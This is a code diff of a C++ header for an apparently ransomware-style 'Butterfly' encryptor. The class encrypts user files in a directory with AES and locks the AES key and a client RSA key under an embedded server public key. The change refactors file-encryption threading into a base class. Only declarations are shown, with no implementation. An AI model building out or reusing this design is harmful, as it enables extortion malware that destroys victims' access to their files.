@@ -3,8 +3,8 @@
 #define BUTTERFLY_ENCRYPTOR_H
 
 #include <algorithm>
-#include <thread>
 
+#include "crypto/cryptoThread.h"
 #include "crypto/rsaEncryptor.h"
 #include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
@@ -19,23 +19,16 @@ namespace hybrid
 {
 
 /**
- * Class Encryptor to encrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
+ * Class Encryptor to encrypt user files with AES. The CPrivateRSA and AESKeyPair(Key+IV) with RSA
  */
-class Encryptor
+class Encryptor : public CryptoThread
 {
 
 private:
     int _keySize;
-    bool _aesKeyInit;
-    std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
-
-    /**
-     * Validates the AESKey/AESIV length after the AESKey generation
-     */
-    void validateAESKeyLength();
 
     /**
      * Saves the unencrypted AESKeyPair to the filesystem
@@ -50,6 +43,7 @@ private:
     static void checkIfEncryptionFilesExists();
 
 public:
+
     /**
      * Constructor Encryptor
      *
@@ -64,7 +58,7 @@ public:
     /**
      * Destructor Encryptor
      */
-    ~Encryptor() = default;
+    ~Encryptor() override = default;
 
     /**
      * Invokes the provided directory path
@@ -87,23 +81,18 @@ public:
     void encryptFileWithAES(const std::string &filepath);
 
     /**
+     * handles large files with a dedicated thread in base class
+     *
+     * @param filepath: path of the file
+     */
+    void handleLargeFilesWithAES(const std::string &filepath) override;
+
+    /**
      * Encrypts the final AES Key and IV with RSA
      *
      * @param aesKeyPair: AES Key and IV String
      */
     void encryptFinalAESKeyWithRSA(const std::string &aesKeyPair);
-
-    /**
-     * Spawns a new Thread for encrypting the file
-     *
-     * @param filepath: path to the file
-     */
-    void spawnThread(const std::string &filepath);
-
-    /**
-     * Joins the threads in the thread vector
-     */
-    void joinThreads();
 };
 
 } // namespace hybrid
